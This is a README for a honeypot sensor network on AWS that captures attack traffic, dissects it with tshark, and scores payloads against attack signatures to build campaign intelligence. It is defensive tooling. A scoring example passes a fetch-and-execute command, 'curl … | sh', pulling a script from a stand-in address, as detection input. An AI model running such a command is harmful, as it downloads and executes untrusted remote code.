# Deception Shield

An AWS honeypot sensor network that captures live attack traffic and turns it
into structured, queryable threat intelligence.

Each sensor is an Ubuntu EC2 instance running T-Pot's honeypot suite in Docker.
It presents around two dozen deliberately vulnerable-looking services to the
internet, records every packet that arrives, dissects those captures with
Wireshark's engine, and indexes the result into Elasticsearch alongside honeypot
session logs and Suricata verdicts. An analysis toolkit then groups the traffic
into attack patterns, correlates sources into campaigns, and reports on what the
network observed.

```
  internet ──► honeypot listeners ──► full packet capture ──► tshark dissection
                      │                        │                      │
                      │                   Suricata IDS                │
                      │                        │                      │
                      └────────► Logstash ◄────┴──────────────────────┘
                                     │
                          Elasticsearch ──► Kibana
                                     │
                            analysis toolkit ──► attack patterns, campaigns
```

## What it does

**Presents a broad attack surface.** T-Pot supplies honeypots for SSH, Telnet,
SMB, FTP, HTTP, MSSQL, MySQL, PostgreSQL, SIP, MQTT, VNC, RDP and more. Cowrie's
emulated shell holds SSH sessions open long enough to record what an intruder
does after getting in, including the commands they run and the files they fetch.

**Captures everything, at full frame size.** tcpdump writes complete frames and
rotates on both time and size. Nothing is sampled and no payload is truncated, so
a capture can be re-examined later with a question nobody had asked yet.

**Dissects with Wireshark.** tshark reassembles TCP streams and identifies
protocols by dissection rather than by port number, so a payload split across a
dozen segments arrives at the analysis stage as one application message — and a
shell dropper on port 8443 is recognised for what it is.

**Scores every payload.** A weighted signature set recognises fourteen attack
shapes — Log4Shell probes, shell pipelines, reverse shells, SQL injection,
webshell uploads, IoT botnet droppers and others — mapped to MITRE ATT&CK
techniques. Scores fold into triage bands, so the handful of payloads worth a
look separate cleanly from the background scanning that makes up most traffic.

**Correlates sources into campaigns.** Sources sharing attack signatures within
a time window are linked into campaigns through transitive clustering, each with
a confidence score derived from how alike the members are, how many there are,
and how specific the shared behaviour is.

**Ships as infrastructure.** Terraform builds the isolated VPC, sensors, storage
and IAM. Ansible configures the capture pipeline, ELK definitions and dashboards.
Both are idempotent, and re-running them is the mechanism for rolling out change.

## Quick start

```bash
# 1. Configure — set admin_cidr_blocks and ssh_public_key
cd infra/terraform && cp terraform.tfvars.example terraform.tfvars

# 2. Deploy
make tf-init && make tf-plan && make tf-apply

# 3. Provision
make inventory && make provision

# 4. Open the dashboard
terraform -chdir=infra/terraform output kibana_urls
```

Full instructions in [`docs/deployment.md`](docs/deployment.md).

## Analysing captures

The analysis toolkit runs offline against archived captures, on any machine with
tshark installed:

```bash
export CAPTURE_BUCKET=$(terraform -chdir=infra/terraform output -raw capture_bucket)
./scripts/fetch-captures.sh
make replay CAPTURE=captures
```

Which produces a report like:

```
## Summary

- Payload records analysed: 48,120
- Distinct source addresses: 3,847
- Records at suspicious or above: 1,204
- Records rated critical: 88
- Correlated campaigns: 6
- Hosts sweeping ports: 23

## Attack patterns

| Pattern                | Technique | Occurrences | Sources | Ports        |
| ---------------------- | --------- | ----------: | ------: | ------------ |
| `scanner_fingerprint`  | T1595     |       8,204 |   2,103 | 80, 443, 8080 |
| `path_traversal`       | T1083     |         612 |     288 | 80, 8080     |
| `remote_payload_fetch` | T1105     |         344 |     121 | 22, 80, 5555 |
| `log4shell`            | T1190     |          97 |      41 | 80, 443, 8080 |
```

Single payloads can be checked against the signature set directly:

```bash
$ deception-shield score --text 'curl http://198.18.0.9/m.sh | sh'
score      70
triage     likely-malicious
signatures shell_pipe_execution, remote_payload_fetch
techniques T1059, T1105
```

## Repository layout

| Path | Contents |
| --- | --- |
| `infra/terraform/` | VPC, sensors, EBS, S3 archive, IAM, flow logs |
| `ansible/` | Sensor configuration, five roles driven by `site.yml` |
| `stack/` | Compose definition, Logstash pipelines, index templates, dashboards |
| `capture/` | Capture script, tshark extractor image, systemd units |
| `analysis/` | Python toolkit and its test suite |
| `scripts/` | Dashboard import, template application, capture retrieval |
| `docs/` | Architecture, deployment, analysis and runbook |

## Design notes

**The sensor is built to be attacked successfully.** It sits in a dedicated VPC
with no peering, holds no long-lived credentials, requires IMDSv2, and keeps its
management plane on high ports reachable only from operator networks while the
honeypot listeners stay open to the internet. Captures upload to S3 as soon as
they are dissected, so the evidence outlives the host.

**Scoring is implemented twice, deliberately.** A Ruby filter scores events
streaming through Logstash; a Python module scores captures replayed offline
where Logstash is not in the path. Names and weights are identical, so a payload
gets the same verdict either way.

**Campaign correlation requires a shared signature, not just a shared port.**
Behaviour profiles include ports, and without that requirement any two hosts that
probed the same port would correlate perfectly and every quiet day would produce
a spurious campaign.

**Management traffic is excluded from capture.** Recording an operator's own SSH
session would add nothing and would place administrative activity inside an
archive that is treated as hostile data.

## Development

```bash
make install     # analysis toolkit with development extras
make test        # 161 tests
make coverage    # with a coverage report
make validate    # every JSON, NDJSON, YAML and shell file in the repository
```

## Legal

Honeypots are for observing traffic that arrives at infrastructure you control.
Deploy this on your own AWS account, and review your provider's acceptable use
policy before exposing services that invite attack traffic.

## License

MIT
